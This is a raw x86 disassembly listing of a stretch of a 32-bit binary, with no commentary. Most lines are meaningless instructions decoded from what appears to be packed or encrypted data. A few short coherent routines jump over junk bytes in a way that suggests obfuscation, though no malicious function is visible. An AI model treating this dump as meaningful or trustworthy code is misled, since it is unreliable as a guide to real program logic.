  40c865:	cmp    edi,DWORD PTR [edx+0x1aa61ebd]
  40c86b:	call   0x2236:0xec785707
  40c872:	out    0x64,eax
  40c874:	sbb    eax,0x23fe673d
  40c879:	outs   dx,DWORD PTR ds:[esi]
  40c87a:	inc    edi
  40c87b:	std    
  40c87c:	cmc    
  40c87d:	aas    
  40c87e:	outs   dx,BYTE PTR ds:[esi]
  40c87f:	mov    edx,0xa187a684
  40c884:	adc    ecx,esp
  40c886:	push   eax
  40c887:	or     bh,dl
  40c889:	test   DWORD PTR [eax],ecx
  40c88b:	lods   al,BYTE PTR ds:[esi]
  40c88c:	cdq    
  40c88d:	dec    esi
  40c88e:	test   BYTE PTR [ecx-0x518d9ed0],dh
  40c894:	out    dx,al
  40c895:	mov    ebp,DWORD PTR [ebx+0x7b7e0695]
  40c89b:	xchg   ebp,eax
  40c89c:	ja     0x40c8ec
  40c89e:	es js  0x40c84b
  40c8a1:	loopne 0x40c84a
  40c8a3:	js     0x40c8ab
  40c8a5:	outs   dx,DWORD PTR ds:[esi]
  40c8a6:	scas   eax,DWORD PTR es:[edi]
  40c8a7:	pop    edi
  40c8a8:	fs inc ecx
  40c8aa:	pop    esi
  40c8ab:	xchg   ebp,eax
  40c8ac:	jnp    0x40c874
  40c8ae:	nop
  40c8af:	retf   0x2d0c
  40c8b2:	(bad)  
  40c8b3:	sub    DWORD PTR [ebp-0x35],ecx
  40c8b6:	mov    dh,0x22
  40c8b8:	retf   0x178e
  40c8bb:	dec    esi
  40c8bc:	xor    ch,BYTE PTR [esi]
  40c8be:	arpl   WORD PTR [esi],di
  40c8c0:	push   edi
  40c8c1:	pop    esi
  40c8c2:	call   0x2e79:0xb1f0d841
  40c8c9:	mov    ebp,0x6addb694
  40c8ce:	dec    ebp
  40c8cf:	jecxz  0x40c8d7
  40c8d1:	jbe    0x40c876
  40c8d3:	dec    ecx
  40c8d4:	adc    BYTE PTR [esi+0x6ac55f61],dh
  40c8da:	mov    bh,0x32
  40c8dc:	or     eax,0x51875ba7
  40c8e1:	pop    es
  40c8e2:	xor    al,0x6c
  40c8e4:	cmp    eax,0xfd03ba59
  40c8e9:	xchg   DWORD PTR [eax+0x7d8b3830],edx
  40c8ef:	call   0x7d44c127
  40c8f4:	in     al,dx
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	int3   
  40c919:	or     al,0x84
  40c91b:	cmp    ch,ah
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c98f
  40c925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c926:	(bad)  
  40c927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c928:	fwait
  40c929:	sbb    al,0x23
  40c92b:	int3   
  40c92c:	cmp    eax,0xa1546ca6
  40c931:	loop   0x40c952
  40c933:	pop    ebx
  40c934:	jg     0x40c99d
  40c936:	and    BYTE PTR [ebp+0x6f49987b],0xd8
  40c93d:	pop    ds
  40c93e:	pop    ebx
  40c93f:	test   eax,0xdbfc66db
  40c944:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c945:	(bad)  
  40c946:	(bad)  [ecx+eiz*4]
  40c949:	and    DWORD PTR [ecx],esi
  40c94b:	xor    bh,BYTE PTR [edx]
  40c94d:	scas   eax,DWORD PTR es:[edi]
  40c94e:	adc    dh,0x42
  40c951:	(bad)  
  40c952:	scas   al,BYTE PTR es:[edi]
  40c953:	adc    ecx,edi
  40c955:	pop    eax
  40c956:	mov    edx,ebp
  40c958:	in     eax,0x2d
  40c95a:	dec    eax
  40c95b:	adc    BYTE PTR [eax+0x4208b765],ch
  40c961:	dec    ebx
  40c962:	adc    DWORD PTR [ecx],0x94a9e9aa
  40c968:	pop    ebp
  40c969:	icebp  
  40c96a:	xchg   esi,eax
  40c96b:	dec    edi
  40c96c:	mov    ebp,0x18b351d7
  40c971:	popf   
  40c972:	or     edx,DWORD PTR [edx-0x3e821fd5]
  40c978:	sub    BYTE PTR [ebx+0x2f],bh
  40c97b:	in     al,0x69
  40c97d:	mov    bh,0xa6
  40c97f:	xchg   DWORD PTR ds:0x71edb81b,ebx
  40c985:	inc    edi
  40c986:	dec    ebx
  40c987:	lea    esi,[esp+ebp*1+0xc]
  40c98b:	int3   
  40c98c:	jae    0x40ca09
  40c98e:	mov    eax,ds:0x66b8d6df
  40c993:	mov    BYTE PTR [ebx],dh
  40c995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c996:	mov    eax,0x8a768014
  40c99b:	mov    ?,WORD PTR [ebx+0x178c9b36]
  40c9a1:	xchg   BYTE PTR [esi],dl
  40c9a3:	adc    BYTE PTR [edx-0x10],cl
  40c9a6:	cmp    DWORD PTR [edi-0x44],eax
  40c9a9:	jle    0x40ca06
  40c9ab:	sbb    eax,0x9ff80bfd
  40c9b0:	jne    0x40c9a3
  40c9b2:	rol    BYTE PTR [eax-0x1ea606d1],cl
  40c9b8:	push   0xffffff9a
  40c9ba:	add    al,0xe0
  40c9bc:	dec    ebp
  40c9bd:	adc    eax,0xe95a4c36
  40c9c2:	xchg   ebx,eax
  40c9c3:	call   0xbadaf425
  40c9c8:	imul   edx,ebx,0x1a239913
  40c9ce:	sub    DWORD PTR [edi-0x50d65f27],esi
  40c9d4:	add    al,0x87
  40c9d6:	(bad)  
  40c9d7:	sbb    al,0xf4
  40c9d9:	(bad)  
  40c9da:	jb     0x40ca35
  40c9dc:	cld    
  40c9dd:	jmp    0x20292906
  40c9e2:	fsubr  DWORD PTR [ebx]
  40c9e4:	dec    esp
  40c9e5:	xchg   DWORD PTR [esi],ebx
  40c9e7:	jp     0x40c9c8
  40c9e9:	cwde   
  40c9ea:	shl    DWORD PTR [esi-0x73],cl
  40c9ed:	jmp    0x40c97b
  40c9ef:	pop    edi
  40c9f0:	push   ebx
  40c9f1:	push   esi
  40c9f2:	mov    ecx,DWORD PTR [edx-0x5e]
  40c9f5:	dec    ebp
  40c9f6:	stc    
  40c9f7:	mov    ecx,0x14b442d1
  40c9fc:	mov    esi,esi
  40c9fe:	stc    
  40c9ff:	sbb    ecx,ecx
  40ca01:	fsub   DWORD PTR [eax]
  40ca03:	stc    
  40ca04:	(bad)  
  40ca05:	cmp    eax,0x4678775c
  40ca0a:	jb     0x40c9a5
  40ca0c:	in     eax,dx
  40ca0d:	scas   eax,DWORD PTR es:[edi]
  40ca0e:	mov    BYTE PTR [ecx],al
  40ca10:	mov    ebx,DWORD PTR [ecx]
  40ca12:	xchg   DWORD PTR [esi-0x49],eax
  40ca15:	(bad)  
  40ca16:	jbe    0x40ca3e
  40ca18:	pop    eax
  40ca19:	ja     0x40c9f3
  40ca1b:	mov    es,WORD PTR [ecx-0x18]
  40ca1e:	mov    ebx,0xb92e5122
  40ca23:	loop   0x40ca2c
  40ca25:	push   edi
  40ca26:	enter  0x8902,0x69
  40ca2a:	cmc    
  40ca2b:	call   0xa4b580e3
  40ca30:	sbb    edi,DWORD PTR [eax]
  40ca32:	push   es
  40ca33:	add    eax,0x4b443047
  40ca38:	call   ebx
  40ca3a:	pop    eax
  40ca3b:	push   ebx
  40ca3c:	xor    BYTE PTR [ecx],cl
  40ca3e:	cmp    DWORD PTR [ebx+0x6f2affb1],edi
  40ca44:	pop    es
  40ca45:	cmp    DWORD PTR [ebp+0x71],edi
  40ca48:	in     al,dx
  40ca49:	jae    0x40ca3e
  40ca4b:	push   edi
  40ca4c:	cs ret 
  40ca4e:	div    DWORD PTR [edi]
  40ca50:	cdq    
  40ca51:	dec    ebx
  40ca52:	out    dx,al
  40ca53:	lods   al,BYTE PTR ds:[esi]
  40ca54:	loope  0x40c9e7
  40ca56:	aas    
  40ca57:	icebp  
  40ca58:	xchg   esp,eax
  40ca59:	sub    eax,edi
  40ca5b:	repnz fwait
  40ca5d:	stos   BYTE PTR es:[edi],al
  40ca5e:	loope  0x40caa7
  40ca60:	cdq    
  40ca61:	add    bl,bl
  40ca63:	rcr    DWORD PTR [eax-0x4a],1
  40ca66:	xor    BYTE PTR [edi-0x5655b54c],dh
  40ca6c:	ds aam 0xc9
  40ca6f:	inc    edx
  40ca70:	shr    BYTE PTR [esi+eiz*8],1
  40ca73:	sti    
  40ca74:	mov    ch,0x25
  40ca76:	ins    BYTE PTR es:[edi],dx
  40ca77:	inc    ebx
  40ca78:	push   ecx
  40ca79:	xchg   ebx,eax
  40ca7a:	and    dh,al
  40ca7c:	inc    esi
  40ca7d:	ds ret 0xb79a
  40ca81:	jecxz  0x40caa6
  40ca83:	fstp   DWORD PTR [eax]
  40ca85:	pop    esi
  40ca86:	fisub  WORD PTR [ecx-0xf]
  40ca89:	in     eax,0x34
  40ca8b:	and    esp,DWORD PTR [edi-0xa]
  40ca8e:	addr16 jmp 0x40cad8
  40ca91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca92:	adc    BYTE PTR [eax+esi*4],ch
  40ca95:	enter  0x3265,0x68
  40ca99:	sub    BYTE PTR [ebx+0x5a],ah
  40ca9c:	mov    WORD PTR [esi],ds
  40ca9e:	repz test al,0xe4
  40caa1:	push   esi
  40caa2:	add    al,0x33
  40caa4:	or     bl,BYTE PTR [ecx]
  40caa6:	int    0x86
  40caa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa9:	ret    
  40caaa:	fs mov bl,0x48
  40caad:	push   edi
  40caae:	dec    ebp
  40caaf:	and    eax,0x64d77f84
  40cab4:	dec    edi
  40cab5:	sbb    dl,al
  40cab7:	sahf   
  40cab8:	clc    
  40cab9:	jp     0x40cafc
  40cabb:	gs jge 0x40ca62
  40cabe:	gs mov dh,0xe3
  40cac1:	ins    BYTE PTR es:[edi],dx
  40cac2:	mov    ebx,0xc3196395
  40cac7:	scas   al,BYTE PTR es:[edi]
  40cac8:	xlat   BYTE PTR ds:[ebx]
  40cac9:	lea    eax,[eax]
  40cacb:	test   BYTE PTR [edi+0x37eb112a],bl
  40cad1:	pop    eax
  40cad2:	stos   BYTE PTR es:[edi],al
  40cad3:	dec    edx
  40cad4:	pushf  
  40cad5:	push   0xf
  40cad7:	les    eax,FWORD PTR [esi+0x11]
  40cada:	adc    ebp,DWORD PTR [ebx+0xf9c4394]
  40cae0:	jmp    0x40ca94
  40cae2:	xchg   edx,eax
  40cae3:	push   ebp
  40cae4:	cld    
  40cae5:	pop    esi
  40cae6:	adc    esp,DWORD PTR [ecx+0x153d5731]
  40caec:	imul   ecx,DWORD PTR [esi],0xffffffb6
  40caef:	push   es
  40caf0:	inc    ecx
  40caf1:	fwait
  40caf2:	aas    
  40caf3:	jmp    0xdf2b:0x68772f7
  40cafa:	jbe    0x40ca89
  40cafc:	aad    0xf0
  40cafe:	mov    cl,0x53
  40cb00:	out    dx,al
  40cb01:	ss jbe 0x40caf7
  40cb04:	cld    
  40cb05:	cmp    DWORD PTR [esi-0x64],0xffffffec
  40cb09:	mov    ecx,0xb92923b7
  40cb0e:	sti    
  40cb0f:	lock imul edx,DWORD PTR [ebp+0x2555aef],0x2c
  40cb17:	xor    eax,0xab068e5f
  40cb1c:	push   ebp
  40cb1d:	sbb    DWORD PTR [edi+0x5b5385a],ecx
  40cb23:	rcl    edi,cl
  40cb25:	add    al,0xe9
  40cb27:	xlat   BYTE PTR ds:[ebx]
  40cb28:	sub    BYTE PTR [edx-0xf],0x88
  40cb2c:	fmul   DWORD PTR [edx+0x46]
  40cb2f:	sub    eax,0x754ee650
  40cb34:	inc    esi
  40cb35:	ja     0x40caee
  40cb37:	retf   
  40cb38:	in     al,dx
  40cb39:	cmp    DWORD PTR [ecx-0x38],ebx
  40cb3c:	sti    
  40cb3d:	jg     0x40cb1b
  40cb3f:	bound  ebx,QWORD PTR ds:0xc823341e
  40cb45:	fild   WORD PTR [edx+edi*8]
  40cb48:	dec    ebx
  40cb49:	repnz push ecx
  40cb4b:	adc    esp,DWORD PTR [eax-0x74226558]
  40cb51:	cli    
  40cb52:	loop   0x40cb9e
  40cb54:	ror    BYTE PTR ss:[ebx],1
  40cb57:	scas   eax,DWORD PTR es:[edi]
  40cb58:	xor    DWORD PTR [esi-0x46],esp
  40cb5b:	sub    BYTE PTR ds:0x868027fe,dl
  40cb61:	int    0x45
  40cb63:	push   esi
  40cb64:	add    BYTE PTR [eax+0x6],cl
  40cb67:	retf   
  40cb68:	cld    
  40cb69:	pop    esp
  40cb6a:	mov    eax,0x80a7b47d
  40cb6f:	jp     0x40cb22
  40cb71:	sub    ecx,DWORD PTR [esi+0x1af675f2]
  40cb77:	mov    edi,0x485698f4
  40cb7c:	std    
  40cb7d:	add    al,0x9a
  40cb7f:	call   0xc935:0x8c724418
  40cb86:	add    eax,0x2abeadee
  40cb8b:	mov    DWORD PTR ds:0x93dc63c,edi
  40cb91:	pop    ebp
  40cb92:	mov    ah,0x88
  40cb94:	daa    
  40cb95:	cmp    al,0x6a
  40cb97:	jae    0x40cb48
  40cb99:	cmp    al,bl
  40cb9b:	call   0xe5832100
  40cba0:	jmp    0x40cb70
  40cba2:	pop    ss
  40cba3:	stc    
  40cba4:	jmp    0x40cbf5
  40cba6:	lods   eax,DWORD PTR ds:[esi]
  40cba7:	sub    ch,ah
  40cba9:	jge    0x40cb54
  40cbab:	(bad)  [ecx]
  40cbad:	(bad)  
  40cbae:	loopne 0x40cb58
  40cbb0:	cmp    edx,esp
  40cbb2:	neg    edx
  40cbb4:	pop    ebx
  40cbb5:	ficom  WORD PTR [esi+0x12]
  40cbb8:	vandnps ymm0,ymm0,YMMWORD PTR [ebx-0x254d442a]
  40cbc0:	(bad)  
  40cbc1:	sub    BYTE PTR [edi-0x78],dl
  40cbc4:	lock jecxz 0x40cbd9
  40cbc7:	xchg   ah,bl
  40cbc9:	stos   DWORD PTR es:[edi],eax
  40cbca:	push   esp
  40cbcb:	fnstcw WORD PTR [edx]
  40cbcd:	mov    ?,WORD PTR [eax+0x20]
  40cbd0:	pop    ecx
  40cbd1:	adc    al,0xa1
  40cbd3:	loop   0x40cb56
  40cbd5:	aad    0x94
  40cbd7:	fcomi  st,st(4)
  40cbd9:	stos   DWORD PTR es:[edi],eax
  40cbda:	cmp    DWORD PTR [edx+0x1071410],esi
  40cbe0:	cmp    al,0xb5
  40cbe2:	sahf   
  40cbe3:	jns    0x40cc18
  40cbe5:	les    esi,FWORD PTR [edx]
  40cbe7:	jo     0x40cb9b
  40cbe9:	xchg   ebx,eax
  40cbea:	pop    edi
  40cbeb:	cmp    al,0xaf
  40cbed:	pusha  
  40cbee:	daa    
  40cbef:	sahf   
  40cbf0:	add    ebp,DWORD PTR [ecx]
  40cbf2:	mov    dh,0x7e
  40cbf4:	and    BYTE PTR [ecx-0x644039c6],dl
  40cbfa:	mov    dh,ah
  40cbfc:	pop    esi
  40cbfd:	lods   al,BYTE PTR ds:[esi]
  40cbfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbff:	xchg   edi,eax
  40cc00:	xchg   ebp,eax
  40cc01:	rcr    edx,0x39
  40cc04:	xchg   ebp,eax
  40cc05:	leave  
  40cc06:	xchg   esi,esi
  40cc08:	dec    esi
  40cc09:	mov    edx,0x51070657
  40cc0e:	imul   esp,DWORD PTR [edx+0x1b],0x56
  40cc12:	inc    esi
  40cc13:	or     BYTE PTR [ecx+0x3d53c7de],dh
  40cc19:	fsub   DWORD PTR [edi+0x4a2225dc]
  40cc1f:	inc    ebp
  40cc20:	mov    esp,0xc596cca5
  40cc25:	push   edx
  40cc26:	or     al,0x2f
  40cc28:	add    ch,bh
  40cc2a:	sbb    esp,DWORD PTR [edi+eax*8+0x660c5187]
  40cc31:	or     BYTE PTR [ecx-0x45e2a3cb],0x60
  40cc38:	mov    DWORD PTR [ebp+0xa],0x603b06f9
  40cc3f:	mov    BYTE PTR [esi],bl
  40cc41:	jno    0x40cc7d
  40cc43:	arpl   WORD PTR ds:0x4e825c80,si
  40cc49:	and    eax,ebp
  40cc4b:	fild   DWORD PTR [ebx]
  40cc4d:	test   BYTE PTR [esi],0x49
  40cc50:	and    dh,BYTE PTR [esi-0x7f]
  40cc53:	pop    ss
  40cc54:	fadd   DWORD PTR cs:[edi+0x6e84e5b4]
  40cc5b:	xchg   edi,edx
  40cc5d:	(bad)  
  40cc5e:	iret   
  40cc5f:	inc    esi
  40cc60:	outs   dx,DWORD PTR ds:[esi]
  40cc61:	outs   dx,DWORD PTR ds:[esi]
  40cc62:	inc    ebx
  40cc63:	and    edx,edi
  40cc65:	xchg   ebx,eax
  40cc66:	pop    edx
  40cc67:	dec    edx
  40cc68:	(bad)  
  40cc69:	in     al,dx
  40cc6a:	and    eax,0x2f9f2963
  40cc6f:	mov    esi,0xfcf0fbf8
  40cc74:	jl     0x40ccd5
  40cc76:	es hlt 
  40cc78:	and    edi,DWORD PTR [ebp+0x1d]
  40cc7b:	cmp    DWORD PTR [edi-0x70],edi
  40cc7e:	mov    BYTE PTR [eax],bl
  40cc80:	add    al,0x6b
  40cc82:	dec    BYTE PTR ds:0x692c413d
  40cc88:	stc    
  40cc89:	pop    eax
  40cc8a:	pop    esp
  40cc8b:	mov    bh,0x45
  40cc8d:	and    ebp,DWORD PTR [edi+0x3c]
  40cc90:	inc    esp
  40cc91:	outs   dx,BYTE PTR cs:[esi]
  40cc93:	adc    al,0x5f
  40cc95:	adc    al,0x4d
  40cc97:	lock test DWORD PTR [edi+0x4e],ebp
  40cc9b:	fmul   QWORD PTR [esi+0x9]
  40cc9e:	mov    cl,0xc6
  40cca0:	jb     0x40cc81
  40cca2:	mov    bh,0x65
  40cca4:	mov    cl,0x39
  40cca6:	add    ebp,DWORD PTR [edi+0x3d]
  40cca9:	mov    BYTE PTR ds:0x68910df5,cl
  40ccaf:	and    eax,0x3093f570
  40ccb4:	sar    BYTE PTR [ebx],1
  40ccb6:	into   
  40ccb7:	popf   
  40ccb8:	jle    0x40cc65
  40ccba:	mov    DWORD PTR [eax+0x50],ebp
  40ccbd:	in     al,0xa1
  40ccbf:	jl     0x40cce7
  40ccc1:	and    DWORD PTR [ecx],edx
  40ccc3:	or     BYTE PTR [esi],ch
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	xor    esp,0xffffffa7
  40cd18:	jb     0x40cccd
  40cd1a:	or     edx,DWORD PTR [eax+0x7d9f7070]
  40cd20:	jo     0x40cd92
  40cd22:	adc    al,0xb1
  40cd24:	mov    ecx,0xe80d3257
  40cd29:	cli    
  40cd2a:	push   ecx
  40cd2b:	xchg   ecx,eax
  40cd2c:	sbb    al,0xc2
  40cd2e:	xlat   BYTE PTR ds:[ebx]
  40cd2f:	loope  0x40cd9c
  40cd31:	jl     0x40cd1f
  40cd33:	scas   al,BYTE PTR es:[edi]
  40cd34:	push   ebx
  40cd35:	dec    ebp
  40cd36:	das    
  40cd37:	std    
  40cd38:	jae    0x40cd6c
  40cd3a:	lock das 
  40cd3c:	and    DWORD PTR [edx],esi
  40cd3e:	je     0x40cd85
  40cd40:	lods   eax,DWORD PTR ds:[esi]
  40cd41:	inc    eax
  40cd42:	stos   DWORD PTR es:[edi],eax
  40cd43:	je     0x40cd4e
  40cd45:	scas   eax,DWORD PTR es:[edi]
  40cd46:	(bad)  
  40cd47:	jnp    0x40cd62
  40cd49:	jmp    0xf3ad:0x85b50f1b
  40cd50:	push   ecx
  40cd51:	mov    dh,0xaa
  40cd53:	stos   DWORD PTR es:[edi],eax
  40cd54:	mov    ds:0xd7459f7c,al
  40cd59:	sub    eax,esp
  40cd5b:	push   cs
  40cd5c:	adc    al,0x98
  40cd5e:	dec    ecx
  40cd5f:	add    eax,0xc9d3e37c
  40cd64:	stc    
  40cd65:	and    edx,esi
  40cd67:	cdq    
  40cd68:	iret   
  40cd69:	mov    ds:0x85c7f5bf,al
  40cd6e:	mov    bl,0x5b
  40cd70:	push   ds
  40cd71:	loop   0x40cd1b
  40cd73:	fs imul ecx,ebp,0xffffff8e
  40cd77:	push   ebx
  40cd78:	push   ecx
  40cd79:	xchg   BYTE PTR [ebp+ebp*2+0x321f25a7],dh
  40cd80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd81:	pop    edx
  40cd82:	add    eax,0xc079ac0f
  40cd87:	mov    WORD PTR [edi+ecx*2+0x16],?
  40cd8b:	sub    esp,DWORD PTR [esi-0x58]
  40cd8e:	nop
  40cd8f:	xor    bl,BYTE PTR [ecx+0x32]
  40cd92:	int3   
  40cd93:	mov    esp,0x7868b9f1
  40cd98:	(bad)  
  40cd99:	cmp    ebx,ecx
  40cd9b:	ins    DWORD PTR es:[edi],dx
  40cd9c:	mov    ds:0x5555e534,al
  40cda1:	inc    ebp
  40cda2:	pop    bx
  40cda4:	(bad)  [eax-0x42ad179]
  40cdaa:	ret    0xf746
  40cdad:	xor    bh,BYTE PTR [eax-0x44]
  40cdb0:	mov    eax,ds:0xb2a6ab86
  40cdb5:	cmp    eax,0x63852ab5
  40cdba:	add    DWORD PTR [esi],edi
  40cdbc:	sub    dl,BYTE PTR [ebx]
  40cdbe:	in     al,dx
  40cdbf:	sahf   
  40cdc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdc1:	ret    
  40cdc2:	mov    esi,0x4b071302
  40cdc7:	sub    BYTE PTR [ecx-0x19],bh
  40cdca:	js     0x40cdbd
  40cdcc:	mov    ds:0x17114979,al
  40cdd1:	das    
  40cdd2:	jp     0x40cd6f
  40cdd4:	in     al,dx
  40cdd5:	nop
  40cdd6:	(bad)  
  40cdd7:	cmp    DWORD PTR ds:0x5556a3d3,esi
  40cddd:	jb     0x40ce08
  40cddf:	icebp  
  40cde0:	push   cs
  40cde1:	out    dx,eax
  40cde2:	mov    ecx,0x8f6a87af
  40cde7:	ds jae 0x40cda7
  40cdea:	sar    ecx,1
  40cdec:	and    eax,0x61f489f5
  40cdf1:	fwait
  40cdf2:	data16 test BYTE PTR [edi-0x159f789b],0x82
  40cdfa:	add    al,0x24
  40cdfc:	dec    eax
  40cdfd:	jle    0x40cd8e
  40cdff:	jl     0x40ce40
  40ce01:	ins    DWORD PTR es:[edi],dx
  40ce02:	sbb    ebp,DWORD PTR [eax+0x15265370]
  40ce08:	shr    ah,0xd0
  40ce0b:	mov    dl,0xe
  40ce0d:	test   al,0x6a
  40ce0f:	xchg   ebp,eax
  40ce10:	xchg   ebx,eax
  40ce11:	push   ebx
  40ce12:	jb     0x40cdce
  40ce14:	jnp    0x40ce3b
  40ce16:	mov    eax,ds:0x4c3939a9
  40ce1b:	sti    
  40ce1c:	dec    esp
  40ce1d:	mov    cl,0x6c
  40ce1f:	call   0xc5fc5339
  40ce24:	xchg   esi,eax
  40ce25:	cli    
  40ce26:	xchg   edx,eax
  40ce27:	sub    DWORD PTR [ebp+0x48f1a744],edi
  40ce2d:	dec    DWORD PTR ds:0x5497de95
  40ce33:	pop    edx
  40ce34:	dec    edx
  40ce35:	int    0x18
  40ce37:	and    BYTE PTR [ebx+0x122aa8f2],bh
  40ce3d:	hlt    
  40ce3e:	pop    esi
  40ce3f:	sbb    bh,cl
  40ce41:	push   edx
  40ce42:	std    
  40ce43:	xor    eax,0xf6322ae2
  40ce48:	sub    al,0xaf
  40ce4a:	pop    esi
  40ce4b:	imul   esi,DWORD PTR [edi],0xffffffe9
  40ce4e:	les    eax,FWORD PTR [edx-0x34]
  40ce51:	cmp    edx,edx
  40ce53:	lods   eax,DWORD PTR ds:[esi]
  40ce54:	ficomp DWORD PTR [edi+edx*8]
  40ce57:	mov    WORD PTR [ebx-0x3f],gs
  40ce5a:	sub    edx,DWORD PTR [ecx+esi*8-0x32]
  40ce5e:	js     0x40ce26
  40ce60:	sbb    BYTE PTR [edx+0x15eda13f],0x51
  40ce67:	repz mov ecx,0x38bb5643
  40ce6d:	cwde   
  40ce6e:	adc    al,0xfd
  40ce70:	ret    0xed36
  40ce73:	sbb    eax,0xaa309561
  40ce78:	inc    edx
  40ce79:	jbe    0x40ce1f
  40ce7b:	test   eax,0x9ed1d6d3
  40ce80:	sar    BYTE PTR [edi+0x78f1d64],0x5d
  40ce87:	scas   eax,DWORD PTR es:[edi]
  40ce88:	cwde   
  40ce89:	xchg   ecx,eax
  40ce8a:	into   
  40ce8b:	pushf  
  40ce8c:	xchg   edx,eax
  40ce8d:	mov    ecx,cs
  40ce8f:	lods   al,BYTE PTR ds:[esi]
  40ce90:	mov    WORD PTR [ecx+eiz*1-0x1c],ds
  40ce94:	xor    al,0x75
  40ce96:	add    al,0x6f
  40ce98:	cli    
  40ce99:	push   ds
  40ce9a:	jmp    0x40ceb6
  40ce9c:	mov    edi,DWORD PTR [ebp+0x20d9b229]
  40cea2:	adc    bl,dl
  40cea4:	nop
  40cea5:	dec    edx
  40cea6:	dec    ecx
  40cea7:	icebp  
  40cea8:	stos   DWORD PTR es:[edi],eax
  40cea9:	dec    ebp
  40ceaa:	jle    0x40ceec
  40ceac:	xor    esi,DWORD PTR [ecx-0x2f9f67fe]
  40ceb2:	pusha  
  40ceb3:	mov    ch,0xbb
  40ceb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb6:	sub    eax,0xd7ed10d1
  40cebb:	aam    0x24
  40cebd:	dec    esi
  40cebe:	and    edi,esp
  40cec0:	test   DWORD PTR [ebx-0x2d361188],ebx
  40cec6:	sbb    al,0x5f
  40cec8:	ret    0x45c5
  40cecb:	jbe    0x40cf20
  40cecd:	pop    eax
  40cece:	fisub  DWORD PTR [esp+eax*4+0x53]
  40ced2:	push   ds
  40ced3:	cwde   
  40ced4:	push   0x1b
  40ced6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ced7:	into   
  40ced8:	pusha  
  40ced9:	adc    al,0x8e
  40cedb:	push   ds
  40cedc:	dec    edx
  40cedd:	and    al,dl
  40cedf:	dec    esi
  40cee0:	xchg   esp,eax
  40cee1:	ins    DWORD PTR es:[edi],dx
  40cee2:	retf   
  40cee3:	add    al,0x47
  40cee5:	popf   
  40cee6:	dec    eax
  40cee7:	jmp    0xcff0:0x3d010c8f
  40ceee:	stc    
  40ceef:	jnp    0x40ceb0
  40cef1:	shl    BYTE PTR [eax+ebp*8],0x14
  40cef5:	leave  
  40cef6:	lea    esp,[ecx+0x7d94acc2]
  40cefc:	mov    DWORD PTR [edi+0x4b],eax
  40ceff:	dec    esp
  40cf00:	mov    al,0xc
  40cf02:	push   ebx
  40cf03:	popa   
  40cf04:	ret    0x53bd
  40cf07:	or     cl,ch
  40cf09:	jae    0x40ceb0
  40cf0b:	push   esi
  40cf0c:	xchg   ebx,eax
  40cf0d:	out    0x6d,al
  40cf0f:	jbe    0x40cf6e
  40cf11:	sub    BYTE PTR [edi+0x40],bl
  40cf14:	mov    ch,0xa2
  40cf16:	cmp    al,BYTE PTR [edx+0x45]
  40cf19:	xor    eax,0xf32b6c9a
  40cf1e:	jle    0x40cf81
  40cf20:	or     eax,0x6935b229
  40cf25:	lea    edx,[esp+esi*2]
  40cf28:	in     eax,0x12
  40cf2a:	cmc    
  40cf2b:	add    al,0x5e
  40cf2d:	add    bl,ah
  40cf2f:	jecxz  0x40ced0
  40cf31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf32:	jg     0x40cf52
  40cf34:	pop    ebx
  40cf35:	sbb    ecx,DWORD PTR [ecx+0x3]
  40cf38:	xchg   DWORD PTR [edx],esi
  40cf3a:	(bad)  
  40cf3b:	add    esp,DWORD PTR [ebp-0x5cf9b480]
  40cf41:	cmp    bl,ah
  40cf43:	test   eax,0x885fc93d
  40cf48:	adc    ch,bl
  40cf4a:	xchg   edi,eax
  40cf4b:	xchg   ebp,eax
  40cf4c:	ins    BYTE PTR es:[edi],dx
  40cf4d:	bswap  edi
  40cf4f:	mov    ch,0x40
  40cf51:	jne    0x40cf3e
  40cf53:	mov    edi,0xfa11ae78
  40cf58:	pop    ebx
  40cf59:	sahf   
  40cf5a:	adc    bl,BYTE PTR [eax+0x29]
  40cf5d:	dec    esi
